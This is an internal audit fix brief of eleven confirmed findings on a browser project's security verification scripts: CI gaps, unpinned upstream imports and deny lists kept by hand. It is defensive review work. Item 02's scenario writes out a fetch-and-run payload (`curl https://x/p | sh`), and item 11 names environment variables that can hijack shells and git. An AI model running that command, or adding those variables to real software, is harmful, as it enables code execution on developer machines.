# Fix brief: H2-harness-static-hosting

Lane: harness. Items: 11. Files this group owns: `scripts/verify-orca-credential-store.mjs`, `scripts/verify-orca-pairing-containment.mjs`, `scripts/verify-orca-offer-file.mjs`, `scripts/verify-orca-offer-scan.mjs`, `scripts/lib/orca-offer-scan.mjs`, `scripts/verify-orca-service.mjs`, `scripts/verify-orca-failure-classes.mjs`, `scripts/verify-orca-mobile-protocol.mjs`, `scripts/verify-sidecar-origin-gate.mjs`, `scripts/verify-shell-request-kinds.mjs`.

Item IDs: harness-static-hosting-03; harness-static-hosting-01; harness-static-hosting-02; harness-static-hosting-04; harness-static-hosting-08; harness-static-hosting-07; harness-static-hosting-06; harness-static-hosting-05; harness-static-hosting-10; harness-static-hosting-11; harness-static-hosting-12.

## harness-static-hosting-03: runCollector turns a read() exception into a green sink whenever the control was found

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/lib/orca-offer-scan.mjs:223`

**What is wrong.** runCollector catches an exception from collector.read and sets unreadable = true, but leaves got as { chunks: [], faults: [] }. collectorLine reports unreadable only inside the blind branch. So when control() succeeds and read() throws, the result is 'control found, 0 matches' with no faults, which is green. Every needle and every fault that read() was building is discarded, including the bridge-folder mode faults and the stray-copy faults. The lib's own rule says an unread sink is never green, and this path breaks it.

**Scenario.** During the live pairing-containment run, bridgeFolderCollector runs while orcad is up. Its control reads web-pairing and passes. read() then lists the folder, and an entry is replaced between readdirSync and lstatSync (a writePrivateFile temp-then-rename, or the offer rewritten on reconnect), or a stray file is mode 0200, which passes the `(mode & 0o077) === 0` test, so readFileSync throws EACCES. read() throws, a 0644 web-pairing in the same folder or a second copy of the offer is never reported, and the sink prints 'sink bridge folder: control found, 0 matches'.

**Evidence.** scripts/lib/orca-offer-scan.mjs:222-224 `try { control = collector.control(ctx) === true; } catch { ... unreadable = true; } try { got = collector.read(ctx) ?? got; } catch { unreadable = true; } return { sink, blind: !control, matches: countMatches(got.chunks, ...), faults: got.faults ?? [], unreadable };`. :230 `if (r.blind) reasons.push(`collector blind (control not found${r.unreadable ? ', sink unreadable' : ''})`);` with no branch for `unreadable && !blind`. :436-442 bridgeFolderCollector.read calls lstatSync and readFileSync per entry without try/catch.

**Suggested fix.** In collectorLine, push a red reason ('sink unreadable') whenever r.unreadable is true, whatever the control result. In bridgeFolderCollector.read, catch each entry's lstat or read error and record it as a named fault instead of throwing.

**Verifier (CONFIRMED, medium).** runCollector (orca-offer-scan.mjs:218-224) catches a read() throw, sets unreadable, and keeps got = { chunks: [], faults: [] }. collectorLine (:228-236) uses unreadable only inside the blind branch. With control true and read() throwing, the result has no reasons and the line reads 'control found, 0 matches' (green). report() in verify-orca-pairing-containment.mjs:350-363 never reads r.unreadable either, so no later guard catches it. bridgeFolderCollector.read (:425-447) calls lstatSync(bridgeDir), lstatSync per entry and readFileSync per stray with no try/catch, so an entry removed between readdirSync and lstatSync (ENOENT), or a 0200 stray (passes (mode & 0o077) === 0, then EACCES on read), throws and drops every fault it had built. Whether such a throw happens in a live run is a runtime question, but the defect itself, an unread sink reported green, is in the code as described. *Checked at:* scripts/lib/orca-offer-scan.mjs:218-236, 425-447; scripts/verify-orca-pairing-containment.mjs:350-363 (no unreadable check)

## harness-static-hosting-01: Pin-derived security clauses SKIP in every CI job and the driver counts the SKIP as PASS; the Orca re-pin replay does not run them

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-credential-store.mjs:169`

**What is wrong.** The clauses that tie PowerBrowser's RUN-09 refusal and protection sentence to the pinned orcad (override name and trigger value, isTemporaryKeyDir roots, written key-record backends) run only when orca/ is fetched. Without it they push one SKIP note and the script exits 0 with a PASS line. The same pattern holds for orca-failure-classes clause 3 (Orca's reason unions), orca-offer-file's decode agreement with Orca's parser, orca-service clause 9 (pinned codes and port) and orca-mobile-protocol, which SKIPs whole. verify.yml (the CI --quick gate) fetches upstream/ and builds theia/ but never runs fetch-orca.sh. The run loop in verify-platform.sh marks a row PASS on exit 0 and does not look for SKIP lines. rebase-orca.sh, the only job that checks out a new Orca tag, runs ROWS=(orca-build-shape orca-overlay orca-overlay-built orca-mobile-protocol licence-allowlist orca-mobile-skew). That list leaves out orca-credential-store, orca-failure-classes, orca-offer-file and orca-service, and its skip_line refusal applies only to the listed rows. The self-tests that need typescript (credential-store:254, failure-classes:267) or orca/ (mobile-skew-self-test:422) also print SKIP and return 0. The live rows orca-pairing-containment (line 257) and orca-offer-scan (line 159) return 0 on a SKIP when there is no build, and the driver counts that as PASS too.

**Scenario.** An Orca re-pin moves to a tag where orcad-secret-key-resolution.ts writes { backend: 'os-keyring' }, or renames ORCA_HEADLESS_SECRET_STORE. rebase-orca.yml replays green because its ROWS skip orca-credential-store. The bump PR's verify.yml run has no orca/, so orca-credential-store prints 'SKIP of the pinned-source clauses only' and is summarised as PASS. The PR merges while the privacy.html protection sentence and the plaintext refusal are false at the new pin. Only a developer who happens to run --quick with orca/ fetched later sees the red.

**Evidence.** scripts/verify-orca-credential-store.mjs:169-171 `if (!existsSync(paths.orcaDir) || !ts) { notes.push(`SKIP of the pinned-source clauses only -- ...`) }`, then main prints notes and `process.exit(0)` (lines 333-339). scripts/verify-orca-failure-classes.mjs:181-182 has the same branch. scripts/verify-orca-offer-file.mjs:214-215 `passes.push(`SKIP decode agreement ...`)`. scripts/verify-orca-service.mjs:979-980. scripts/verify-orca-mobile-protocol.mjs:175 returns {skip}, and render gives code 0. scripts/verify-platform.sh:6977-6986 `wait "$CURRENT_CHECK_PID" || row_ok=0 ... SUMMARY+=("$label: PASS")`. .github/workflows/verify.yml:79-93 runs only fetch-upstream/apply-patches, theia install/build, then `verify-platform.sh --quick` (no fetch-orca.sh). scripts/rebase-orca.sh:50 `ROWS=(orca-build-shape orca-overlay orca-overlay-built orca-mobile-protocol licence-allowlist orca-mobile-skew)`.

**Suggested fix.** Add a fetch-orca.sh step (pinned tag and commit, no build) to verify.yml before the --quick table. Add orca-credential-store, orca-failure-classes, orca-offer-file and orca-service to rebase-orca.sh ROWS so the replay's skip_line refusal covers them. Make the driver treat a '<label>: SKIP' or 'SKIP of' line as red under --gate, or give these scripts a --require-pin flag that CI passes and that turns the SKIP into exit 1.

**Verifier (CONFIRMED, medium).** I traced every step of the claim and each one holds.

1. scripts/verify-orca-credential-store.mjs:168-171 checks for orca/ and typescript. When either is missing it pushes the note 'SKIP of the pinned-source clauses only' and skips the derivePinned clauses: the override name and trigger value from orcad-secret-key-resolution.ts, the isTemporaryKeyDir roots, and the written backends. Main (lines 332-339) prints the notes and, with no fails, prints PASS and calls process.exit(0). The same named-SKIP branches exist in verify-orca-failure-classes.mjs:180-182 (clause 3, Orca's reasons), verify-orca-offer-file.mjs:214-215 (decode agreement), verify-orca-service.mjs:979-980 (clause 9, pinned source) and verify-orca-mobile-protocol.mjs:175 (a whole-check skip).
2. The run loop in verify-platform.sh (6973-6990) decides a row only from the exit status of `wait` plus the orcad leak leg. It never scans the output for SKIP, so these rows are recorded as "label: PASS".
3. verify.yml runs on push and pull_request. It fetches upstream/, applies patches, builds theia/ and runs `verify-platform.sh --quick`. No workflow step runs fetch-orca.sh; grep finds fetch-orca only in release.yml and release-train.yml. typescript is installed in that job, so orca/ is the missing input and the SKIP branch is taken. The release.yml jobs that do fetch orca/ run only packaged-tree rows (line 212: ng063-packaged-launch ... orca-packaged-tree) and verify-orca-packaged-tree.mjs, not these rows.
4. scripts/rebase-orca.sh:50 sets ROWS to orca-build-shape, orca-overlay, orca-overlay-built, orca-mobile-protocol, licence-allowlist and orca-mobile-skew. stage_rows (218-226) applies the skip_line refusal only to those rows. orca-credential-store, orca-failure-classes, orca-offer-file and orca-service are not in the list. rebase-orca.yml:106 calls only rebase-orca.sh, and the replay never runs --quick.

Result: during an Orca re-pin, the replay job is the one CI job that has the new orca/ tree, and it never runs the clauses that tie the RUN-09 refusal and the privacy sentence to the pin. The bump PR's verify.yml run has no orca/, so those clauses SKIP and the rows read PASS. The clauses do go red when a developer runs them locally with orca/ fetched, so the check is not dead everywhere. I found no guard, and no owner decision in DECISIONS.md that accepts this.

Why medium, not high: the trigger is an upstream Orca change, not an attacker-controlled input. The checks work when orca/ is present, so this is a CI coverage gap in a defence-in-depth gate that has a concrete path (a silent rename of the plaintext override, or a backend drift), not a check that can never go red. *Checked at:* scripts/verify-orca-credential-store.mjs:169-171 and 332-339 (SKIP note then exit 0 PASS); scripts/verify-platform.sh:6976-6990 (row PASS on exit status only); .github/workflows/verify.yml:79-93 (no fetch-orca.sh); scripts/rebase-orca.sh:50 and 218-226 (ROWS leaves out orca-credential-store, orca-failure-classes, orca-offer-file and orca-service; skip_line applies only to ROWS); .github/workflows/release.yml:211-213 (fetch-orca jobs run only packaged rows)

## harness-static-hosting-02: orca-mobile-skew runs TypeScript fetched from an unpinned upstream tag on the developer machine

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-mobile-protocol.mjs:343`

**What is wrong.** The --skew row lists every tag on the Orca remote and picks the newest mobile-android-vX.Y.Z by version number. It partially clones that tag, reads mobile/src/transport/protocol-version.ts with git show, writes the text to a .mts file and loads it with dynamic import(). Loading the file runs its top-level code with the developer's full environment. Nothing ties the tag to a reviewed commit: fetch-orca.sh pins the desktop tag and commit, but this tag is whichever is newest at run time. The row is in the full tier (verify-platform.sh:6781), so every plain `scripts/verify-platform.sh` or `--gate` run on a developer machine does this. It also runs in rebase-orca.sh ROWS.

**Scenario.** Someone who can push a tag to github.com/stablyai/orca (a compromised maintainer account or a compromised upstream repo, threat actor f) pushes mobile-android-v99.0.0. Its protocol-version.ts starts with `import { execSync } from 'node:child_process'; execSync('curl https://x/p | sh');` and exports the two integers. The next full verify run on a developer machine imports the file and runs the payload as the developer, with access to ~/.claude, SSH keys and the Cloudflare token file. No re-pin or review is needed.

**Evidence.** scripts/verify-orca-mobile-protocol.mjs:304-307 newestAppTag sorts the remote's tags and takes the highest. :361-364 `execFileSync('git', [... 'clone', ..., '--branch', tag, remote, dir])` then `git show HEAD:<rel>`. :339-343 `writeFileSync(file, text); ... m = await import(pathToFileURL(file).href);`. scripts/verify-platform.sh:6781 `"orca-mobile-skew|node $REPO_ROOT/scripts/verify-orca-mobile-protocol.mjs --skew"`.

**Suggested fix.** Do not execute the downloaded file. Get MOBILE_PROTOCOL_VERSION and MIN_COMPATIBLE_DESKTOP_VERSION with a strict regex or a TypeScript AST read of `export const NAME = <integer literal>`, and treat any other shape as 'constants file moved'. Keep import() only for the pinned tree's evaluateCompat.

**Verifier (CONFIRMED, medium).** I traced the whole path. runSkew (verify-orca-mobile-protocol.mjs:392-401) reads REMOTE from fetch-orca.sh, runs git ls-remote --tags, and newestAppTag (:304-308) takes the highest mobile-android-vX.Y.Z by integer order. Nothing pins it to a commit. appConstants (:361-364) does a depth-1 partial clone of that tag and git show HEAD:<rel>. constantsAt (:351-357) passes the text to importAppConstants (:339-343), which writes it to a .mts file and loads it with dynamic import(). Node type stripping runs the module's top-level code, a node:child_process import included, as the developer. Nothing sandboxes or vets the text before the import; the exports check comes only after it. The row is in the full tier (verify-platform.sh:6781) and in rebase-orca.sh:50 ROWS. The attacker must be able to push tags upstream (threat actor f), which is not the same as holding code execution on the developer machine: the desktop pin is commit-pinned and reviewed, and this tag is not. *Checked at:* scripts/verify-orca-mobile-protocol.mjs:304-308, 339-343, 351-364, 399-401; scripts/verify-platform.sh:6781; scripts/rebase-orca.sh:50

## harness-static-hosting-04: Session-only pairing probe checks the absence of a hand-copied upstream localStorage key

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `scripts/lib/orca-offer-scan.mjs:35`

**What is wrong.** orca-offer-scan's main security assertion is that orca.web.runtimeEnvironment.v1, the key under which Orca's web client keeps its paired runtime environment, is absent from every 127.0.0.1 origin's localStorage (P65-17 session-only pairing). The key name is a literal in the lib, copied from orca/src/renderer/src/web/web-runtime-environment.ts:34 (ENVIRONMENT_STORAGE_KEY), and never derived from the pin. The scan reads only the key column (values may be compressed). pairing-containment's whole-profile scan excludes the Theia origin's storage folder as holder 4. So nothing else covers that origin. This is an absence assertion over a name that can only agree with the tree it was copied from.

**Scenario.** A re-pin brings an Orca version that bumps the key to orca.web.runtimeEnvironment.v2 and drops the session-only branch, so the paired environment, including its device credential, is written to the Theia origin's localStorage. orca-offer-scan still finds the marker key, finds no 'orca.web.runtimeEnvironment.v1', and passes. The whole-profile collector skips storage/default/http+++127.0.0.1+<theia port>. The persisted credential is reported nowhere.

**Evidence.** scripts/lib/orca-offer-scan.mjs:35 `export const RUNTIME_ENV_KEY = 'orca.web.runtimeEnvironment.v1';`. :151 `hasRuntimeKey: keys.includes(RUNTIME_ENV_KEY)`. :187 is the only verdict on it. orca/src/renderer/src/web/web-runtime-environment.ts:34 `const ENVIRONMENT_STORAGE_KEY = 'orca.web.runtimeEnvironment.v1'`. :373-375 profileFiles skips `storage/default/${ctx.theiaOriginDir}`.

**Suggested fix.** Derive the key at check time from ENVIRONMENT_STORAGE_KEY in orca/src/renderer/src/web/web-runtime-environment.ts (red 'source moved' when absent), the way registryFilesFromPin derives holder 5. Better: require that the Theia origin's key set, minus the marker, is a subset of a set derived from the tree.

**Verifier (CONFIRMED, low).** RUNTIME_ENV_KEY is a hand-copied literal (orca-offer-scan.mjs:35) that matches orca/src/renderer/src/web/web-runtime-environment.ts:34. No script derives it from the pin; grep finds no check that reads web-runtime-environment.ts. The literal is also copied in verify-orca-tabs-live.mjs:128 and verify-orca-pane-standalone-live.mjs:364. readOriginKeys reads only key names, and the only verdict on the key is at :187. profileFiles (:373-377) excludes storage/default/<theiaOriginDir>, so the whole-profile byte scan does not cover that origin. A key rename at re-pin would leave this check green, which breaks the CLAUDE.md derive-from-tree rule. Partial mitigation: other live rows assert state().pairing.sessionOnly === true and deviceKeySupport 'session-no-ed25519' (verify-orca-pane-standalone-live.mjs:145, verify-orca-workspace-live.mjs:298). That would catch the dropped session-only branch if state().pairing reflects Orca's stored environment, which I cannot settle statically. The scenario also needs an upstream change at a reviewed re-pin, so I rate it low. *Checked at:* scripts/lib/orca-offer-scan.mjs:35, 151, 187, 373-377; orca/src/renderer/src/web/web-runtime-environment.ts:34,85-91; partial: scripts/verify-orca-pane-standalone-live.mjs:145

## harness-static-hosting-08: Non-loopback-peer collector scans only the orcad and Theia backend pids, not their children

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `scripts/lib/orca-offer-scan.mjs:459`

**What is wrong.** listenSockets joins /proc/net/tcp{,6} LISTEN rows only with the fd tables of the two pids it is given: orcad from getState().pid and the Theia backend. The terminal daemon (a separate process whose pid OrcaService knows), Theia's plugin-host child processes, and any helper orcad forks are not scanned. So a listener off loopback in a child process does not make the 'no remote agent port' sink red.

**Scenario.** A Theia plugin host child of the backend, or an orcad helper process, binds 0.0.0.0:<n>. Only the parent's fds are read, so the sink reports 'control found, 0 matches' and no fault.

**Evidence.** scripts/verify-orca-pairing-containment.mjs:289 `pids: { orcad: [st.orca.pid], theia: [st.theia.pid] }`. scripts/lib/orca-offer-scan.mjs:350-358 iterates only `pids` and reads `/proc/<pid>/fd`. :459 `listenSockets([...(ctx.pids?.orcad ?? []), ...(ctx.pids?.theia ?? [])], ctx.procRoot)`.

**Suggested fix.** Expand each root pid to its descendant set (from /proc/<pid>/task/*/children or a /proc ppid walk) before joining sockets. Include the daemon pid from getState(), and add a self-test plant with a child pid listening on 0.0.0.0.

**Verifier (CONFIRMED, low).** The live ctx gets pids { orcad: [st.orca.pid], theia: [st.theia.pid] } (verify-orca-pairing-containment.mjs:289). listenSockets (orca-offer-scan.mjs:342-363) joins /proc/net/tcp{,6} LISTEN rows only with those pids' /proc/<pid>/fd links, and nonLoopbackPeerCollector.read (:457-460) passes only those two lists. The terminal daemon (a separate pid; the self-test fixture's ready line names it, :146), Theia plugin-host children (plugin-ext is in use, per token-gate's webview handling) and any orcad helper are not enumerated. Their off-loopback listeners are not reported. Hardening of a containment check. *Checked at:* scripts/verify-orca-pairing-containment.mjs:289; scripts/lib/orca-offer-scan.mjs:342-363, 452-462

## harness-static-hosting-07: Credential-store backend clause reads two hand-picked files and never checks the key file's owner-only mode the sentence claims

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-credential-store.mjs:101`

**What is wrong.** Clause 3 builds the 'written backends' set only from orcad-secret-key-resolution.ts and orcad-plaintext-credential-migration.ts. A keyring write added in any other orcad file (orcad-secret-store.ts, orcad-secret-store-startup.ts, orcad-secret-sealing.ts, or a secret-tool store next to the existing lookup in orcad-legacy-keyring-key.ts) is invisible. The protection sentence also says the key file 'only your user account can read', but nothing derived from the pin checks the secure-file mode orcad writes. The live row is the only proof of that.

**Scenario.** A re-pin adds a `secret-tool store` call in a new orcad-secret-keyring-writer.ts. Or it changes writeSecureFile/hardenExistingSecureFile so the key file is created 0644. orca-credential-store stays green, because the two scanned files still write only `backend: 'host-file'`.

**Evidence.** scripts/verify-orca-credential-store.mjs:101 `for (const file of [paths.resolutionFile, paths.migrationFile]) {` ... :110 `if (ts.isPropertyAssignment(n) && n.name.getText() === 'backend' ...)`. orca/src/main/orcad/orcad-legacy-keyring-key.ts:13-19 already runs secret-tool, and orca/src/main/orcad/orcad-secret-key-record.ts:227 `(statSync(path).mode & 0o077) === 0` is not referenced by the check.

**Suggested fix.** Scan every non-test file under orca/src/main/orcad for backend: object literals and for keyring program spawns (secret-tool store, security add-generic-password). Derive and assert the 0o077 restriction of the key record (restrictExistingRecord / the secure-file helper's mode) from the pin.

**Verifier (CONFIRMED, low).** derivePinned (verify-orca-credential-store.mjs:101-114) collects 'backend' property assignments only from paths.resolutionFile and paths.migrationFile. A keyring write in any other orcad file is not seen. orcad-legacy-keyring-key.ts:13-19 already calls secret-tool, as a lookup. No clause derives or checks the secure-file mode (orcad-secret-key-record.ts:227 is not referenced), yet ORCA_PROTECTION_SENTENCE (OrcaEnv.sys.mjs:587-588) claims 'only your user account can read'. The script's own Limit comment hands runtime proof to orca-credential-store-live, so the static row is narrower than its sentence. Hardening. *Checked at:* scripts/verify-orca-credential-store.mjs:101-114 and header Limit; orca/src/main/orcad/orcad-legacy-keyring-key.ts:13-19; orca/src/main/orcad/orcad-secret-key-record.ts:227

## harness-static-hosting-06: orca-offer-file's backend rule does not check the no-follow open or the lstat/fstat inode match that closes the TOCTOU window

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-offer-file.mjs:225`

**What is wrong.** The backend rule requires an lstat and offerFileVerdict before the first read, and accepts any of readNoFollow, readFile, readFileSync, createReadStream or .open( as that read. The protection against the file being swapped for a symlink or another file between lstat and read lives in readNoFollow: O_NOFOLLOW plus an ino/dev comparison with the judged stat. The check does not inspect readNoFollow, and no self-test plant removes either part.

**Scenario.** A change replaces `text = await readNoFollow(full, stat)` with `text = await fs.promises.readFile(full, 'utf8')`, or deletes the `opened.ino !== judged.ino` comparison. orca-offer-file stays green, since lstat and the verdict still come before a matched read. A same-user process that renames a symlink to another file over web-pairing between the lstat and the read gets that file's contents returned as the offer.

**Evidence.** scripts/verify-orca-offer-file.mjs:225 `const firstRead = body.search(/\b(readNoFollow|readFile|readFileSync|createReadStream)\(|\.open\(/);`, and only order is asserted (:232-233). theia/extensions/orca-panes/src/node/orca-panes-backend-module.ts:107-111 `fs.promises.open(full, O_RDONLY | O_NOFOLLOW)` ... `if (!opened.isFile() || opened.ino !== judged.ino || opened.dev !== judged.dev)`.

**Suggested fix.** Require that handOff's first read is readNoFollow(full, stat), and that readNoFollow's body opens with O_NOFOLLOW and compares ino and dev with the judged stat. Add plants for a plain readFile and for a removed inode comparison.

**Verifier (CONFIRMED, low).** The backend rule (verify-orca-offer-file.mjs:225-233) accepts readNoFollow, readFile, readFileSync, createReadStream or .open( as the first read and asserts only that lstat and offerFileVerdict come before it. Nothing inspects readNoFollow's O_NOFOLLOW flag or its ino/dev comparison (orca-panes-backend-module.ts:106-118), and grep finds no other script that references O_NOFOLLOW. The only readNoFollow self-test plant (:270) moves the read ahead of the verdict, so swapping in fs.promises.readFile after the verdict, or deleting the inode comparison, stays green. Impact is limited: the swapping actor is a same-user process, which can already read the user's files. *Checked at:* scripts/verify-orca-offer-file.mjs:225-233, 270; theia/extensions/orca-panes/src/node/orca-panes-backend-module.ts:106-118, 185

## harness-static-hosting-05: Logs sink control never travels the stdout/stderr capture path; a missing capture file reads as empty and the sink stays green

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-pairing-containment.mjs:333`

**What is wrong.** The logs collector's control is 'orcad ready on ' in any log text. The live run takes that line from OrcaService.getRecentLog(), which it reads through chrome evaluation. PowerBrowser's stdout and stderr are tee'd to files through PB_LIVE_STDOUT_PATH/PB_LIVE_STDERR_PATH and then read with `captured()`, which returns '' when the file is absent or unreadable. So the control is found even when nothing from stdout or stderr was captured, and the sink is green without having seen either stream. This is the CLAUDE.md rule 1 failure: the control is not on the path it vouches for.

**Scenario.** A refactor of withFirefoxPage stops honouring the PB_LIVE_STDOUT_PATH default (the only consumer, scripts/lib/firefox-bidi.mjs:642), or the launch path stops going through it. stdout.log is never written, captured('stdout.log') returns ''. With devtools.console.stdout.content on, a console.log of the hand-off text in the Theia frontend would only show up in that stream. The logs sink still prints 'control found, 0 matches'.

**Evidence.** scripts/verify-orca-pairing-containment.mjs:309 `ctx.logTexts = [...diag.orcaLog, ...diag.theiaLog];` (contains the control). :333-334 `const captured = (f) => { try { return readFileSync(join(work, f), 'utf8'); } catch { return ''; } }; ctx.logTexts.push(captured('stdout.log'), captured('stderr.log'));`. scripts/lib/orca-offer-scan.mjs:398 `control: (ctx) => !!ctx.logControl && textsOf(ctx.logTexts).some((t) => t.includes(ctx.logControl))`.

**Suggested fix.** Give each stream its own control: require that stdout.log exists and contains a line PowerBrowser always prints there (for example POWERBROWSER_SHELL_READY or a console marker the run writes on purpose), and that stderr.log exists. Turn a missing capture file into 'collector blind' instead of ''.

**Verifier (CONFIRMED, low).** LOG_CONTROL is 'orcad ready on ' (verify-orca-pairing-containment.mjs:74). ctx.logTexts is filled first from OrcaService.getRecentLog()/TheiaService.getRecentLog() through chrome evaluation (:309), and the control is met from that source alone. stdout/stderr come from the PB_LIVE_STDOUT_PATH/STDERR_PATH tee (:270-271, consumed only by the default parameter in firefox-bidi.mjs:642). They are appended through captured() (:333-334), which returns '' for a missing or unreadable file. logsCollector.control (orca-offer-scan.mjs:398) is satisfied by the getRecentLog text, so a stdout/stderr capture that never happened still reads green. That is the control-not-on-the-vouched-path pattern. The tee currently works, and failure needs a future refactor, so this is hardening rather than a present hole. *Checked at:* scripts/verify-orca-pairing-containment.mjs:74, 270-271, 309, 333-334; scripts/lib/orca-offer-scan.mjs:396-400; scripts/lib/firefox-bidi.mjs:642

## harness-static-hosting-10: orcad's fatal failure codes are a hand-kept pair; the checks prove only that each still exists in the pin

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-service.mjs:985`

**What is wrong.** OrcaService treats exactly ORCAD_PINNED_PORT_CODE and ORCAD_LOCK_HELD_CODE as unrecoverable, and maps them to port-in-use. orca-failure-classes derives its code set from OrcaEnv's own exports (the same source as the subject). orca-service clause 9 only greps the pin for those two strings. Neither derives orcad's code set from the pin and compares it as set equality. A new unrecoverable orcad code therefore goes unnoticed and is retried as a recoverable 'starting orcad' failure.

**Scenario.** A re-pin adds a fatal code such as 'orcad_data_root_unwritable' to orcad's startup errors. Both checks stay green. OrcaService retries orcad up to giveUpAttempts times, then shows could-not-start with Restart. Restart can never succeed for that code, and nothing goes red.

**Evidence.** powerbrowser/shell/OrcaService.sys.mjs:480 `const code = [OrcaEnv.ORCAD_PINNED_PORT_CODE, OrcaEnv.ORCAD_LOCK_HELD_CODE].find(c => text.includes(c));`. scripts/verify-orca-failure-classes.mjs:148 `const codes = Object.entries(env).filter(([k, v]) => /^ORCAD_\w+_CODE$/.test(k) ...)`. scripts/verify-orca-service.mjs:985-988 only checks that each code appears in orca/src/main.

**Suggested fix.** Derive orcad's exit error-code set from the pin (the code: literals of orcad's startup error classes) and compare it as set equality with the codes OrcaService classifies. An unmapped pinned code goes red naming it.

**Verifier (CONFIRMED, low).** OrcaService.sys.mjs:480 hard-codes the two codes [ORCAD_PINNED_PORT_CODE, ORCAD_LOCK_HELD_CODE] as the only non-recoverable stderr codes. Any other stderr text returns recoverable:true at :487, and the loop at :385-395 retries up to giveUpAttempts (default 5). verify-orca-failure-classes.mjs:148 builds its code set from OrcaEnv's own ORCAD_*_CODE exports and checks only that each one maps through ORCA_CODE_CLASSES, so it reads from the same source as the subject. verify-orca-service.mjs:985-989 runs git grep for each of the two OrcaEnv strings in orca/src/main and checks only that each is present. No check takes orcad's code set from the pin and compares it as a set. The gap is not only hypothetical. The current pin already has more fatal codes in the same union as the lock-held code: orca/src/main/orcad/orcad-data-root-privacy.ts:5-13 defines orcad_data_root_unusable, orcad_data_root_wrong_owner, orcad_data_root_shared, orcad_instance_lock_holder_unverifiable, orcad_instance_lock_foreign_identity and orcad_instance_lock_unreadable. OrcaService treats all of them as recoverable, and no check fails. The impact is a correctness problem: retries that cannot succeed, followed by could-not-start. It is not a security problem, so the severity stays low. *Checked at:* powerbrowser/shell/OrcaService.sys.mjs:480,487; powerbrowser/shell/OrcaEnv.sys.mjs:87-88,418-421; scripts/verify-orca-failure-classes.mjs:148-154; scripts/verify-orca-service.mjs:985-989; orca/src/main/orcad/orcad-data-root-privacy.ts:5-13 (six more fatal codes already in the pin)

## harness-static-hosting-11: Scenario A takes its expected environment from the same allowlist as the subject, and the steering deny list is hand-kept

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-service.mjs:934`

**What is wrong.** Scenario A compares orcad's spawned environment names with env.expectedEnvNames(...). That is built from ORCAD_ENV_ALLOWLIST, the same constant buildOrcadEnv uses, so adding a name to the allowlist moves the expectation with it. The only guard against a dangerous addition is the hand-kept STEERING list plus the /^(ORCA|CLAUDE|NODE|ELECTRON)_/ prefix test. Names that change how agents' shells and git run (BASH_ENV, ENV, GIT_SSH_COMMAND, GIT_CONFIG_GLOBAL, PYTHONPATH, PERL5LIB, LD_AUDIT) are on neither.

**Scenario.** A change adds "GIT_SSH_COMMAND" or "BASH_ENV" to ORCAD_ENV_ALLOWLIST to fix an agent issue. Scenario A expects the new name and sees it, and the steering clause does not list it, so orca-service is green. Every Orca agent shell and git call now inherits a variable that runs an arbitrary command.

**Evidence.** scripts/verify-orca-service.mjs:165 `const STEERING = ['NODE_OPTIONS', 'NODE_PATH', 'NODE_REPL_EXTERNAL_MODULE', 'ELECTRON_RUN_AS_NODE', 'XDG_DATA_HOME', 'LD_PRELOAD', 'LD_LIBRARY_PATH'];`. :933-934 `if (STEERING.includes(name) || /^(ORCA|CLAUDE|NODE|ELECTRON)_/.test(name))`. :364 `env.compareEnvNames(Object.keys(spec.environment), env.expectedEnvNames(Object.keys(world.env)))`.

**Suggested fix.** Pin the allowlist with an independent expectation (for example a checked-in list whose change also needs a DECISIONS.md entry, compared as set equality). Or widen the deny rule to every LD_*, *_OPTIONS, BASH_ENV/ENV, GIT_* and interpreter-path variable.

**Verifier (CONFIRMED, low).** Scenario A at verify-orca-service.mjs:364 compares the spawned names with env.expectedEnvNames(...). OrcaEnv.sys.mjs:385-388 derives that from ORCAD_ENV_ALLOWLIST, the same constant buildOrcadEnv uses (:113), so the expected set changes whenever the allowlist changes. The only content guard is static clause 3 at :933-934. It checks the hand-kept STEERING list at :165 (NODE_OPTIONS, NODE_PATH, NODE_REPL_EXTERNAL_MODULE, ELECTRON_RUN_AS_NODE, XDG_DATA_HOME, LD_PRELOAD, LD_LIBRARY_PATH) and the prefix test /^(ORCA|CLAUDE|NODE|ELECTRON)_/. BASH_ENV, ENV, GIT_SSH_COMMAND, GIT_CONFIG_GLOBAL, PYTHONPATH, PERL5LIB and LD_AUDIT are on neither. The other scripts that name the allowlist do not guard these names: verify-orca-credential-store.mjs:192 checks only the plaintext override name, and orca-browser-live.mjs only documents HOME. The precondition is a developer editing the allowlist, and the values come from the user's own PowerBrowser environment. HOME and PATH are already allowlisted and already give comparable influence over shells and git. So this is hardening of the review check, not a boundary crossing. *Checked at:* scripts/verify-orca-service.mjs:165,364,933-934; powerbrowser/shell/OrcaEnv.sys.mjs:37-63,113,385-388; no other script guards those names (grep for ORCAD_ENV_ALLOWLIST finds only verify-orca-credential-store.mjs:192 and orca-browser-live.mjs:175)

## harness-static-hosting-12: shell-request-kinds clause 3 finds a handler only when it is called on the same line as its case label

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-shell-request-kinds.mjs:149`

**What is wrong.** The sender-wall clause collects the handlers a case dispatches to with /case\s+"[^"]+"\s*:[^\n]*?return\s+(handle[A-Za-z]+)\s*\(/. That requires the call on the case label's line and a name starting with handle. A case written as a block (`case "orcaFoo": {` with the return on the next line), or a handler with another name, is not collected. Its callers outside the walled switch are then never checked. The 'broken instrument' red fires only when zero handlers are found, and the existing orcaStatus line keeps that from happening.

**Scenario.** A new hosting kind is added as `case "orcaPairNow": {\n  return pairNowHandler(data, actorRef);\n}` and pairNowHandler is also called from the actor's receiveMessage before handleShellMessage. The clause never derives pairNowHandler, so the unwalled second caller passes.

**Evidence.** scripts/verify-shell-request-kinds.mjs:149 `const handlers = [...new Set([...body.matchAll(/case\s+"[^"]+"\s*:[^\n]*?return\s+(handle[A-Za-z]+)\s*\(/g)].map(m => m[1]))];` and :150-152 red only on `!handlers.length`.

**Suggested fix.** Derive handlers from every call expression inside each case arm (from the label to the next case/default), whatever its name or line. Add a plant with a block-form case whose handler has a second caller outside the switch.

